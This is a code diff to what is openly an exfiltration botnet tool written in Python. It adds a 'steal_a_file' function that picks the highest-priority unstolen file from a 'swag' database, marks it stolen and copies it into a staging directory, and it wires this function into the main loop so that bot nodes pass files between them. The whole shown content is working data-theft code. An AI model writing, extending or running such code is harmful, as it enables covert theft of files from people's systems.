@@ -1,6 +1,6 @@
 import xml.etree.ElementTree as etree
 import sqlite3 as sql
-import os, re, socket, subprocess, sys, time
+import os, re, socket, subprocess, sys, time, shutil
 import urllib.request
 import multiprocessing as mp
 import xmlrpc.client
@@ -85,7 +85,7 @@ def get_next_hops(conn, seq_no):
     return next
 
 def create_men_db(conn):
-    ### Create a local SQLite3 database and table to hold data on exfiltration bots
+    '''Create a local SQLite3 database and table to hold data on exfiltration bots'''
     # Connection object comes from the caller
     c = conn.cursor()
     c.execute('drop table if exists men')
@@ -94,14 +94,26 @@ def create_men_db(conn):
     c.close()
 
 def create_file_db(conn):
-    ### Create a local SQLite3 database and table to hold data on files to steal
+    '''Create a local SQLite3 database and table to hold data on files to steal'''
     # Connection object comes from the caller
     c = conn.cursor()
     c.execute('drop table if exists swag')
     c.execute('create table swag(name text, dtg datetime, priority integer, stolen bool)')
     conn.commit()
     c.close()
-
+    
+def steal_a_file(conn):
+    '''Get the highest priority file in the files table and copy it to the datadir'''
+    c = conn.cursor()
+    # First get the name of the file
+    c.execute('select name from swag where stolen = 0 order by priority limit 1')
+    file = c.fetchone()
+    # Now, update the status of this file
+    c.execute('update swag set stolen=\'1\' where name = ?', file)
+    conn.commit()
+    c.close()
+    shutil.copyfile(file[0], data_dir + '/' + file[0].replace('/','_'))
+              
 def store_file_info(conn, filelst):
     '''Store the data from the file list in a local SQLite3 database'''
     # Loop through the filelst and insert the data for each
@@ -313,6 +325,8 @@ if __name__=='__main__':
                 break
             # Check to see whether any new files have come our way since the last
             # loop iteration.
+            if my_seq_no == 0:
+                steal_a_file(conn)
             files = os.listdir(data_dir)
             print(strftime('%H:%M:%S') + ' Files in the data directory:', files)
             # For those bots that have clients, we need to send these files to the
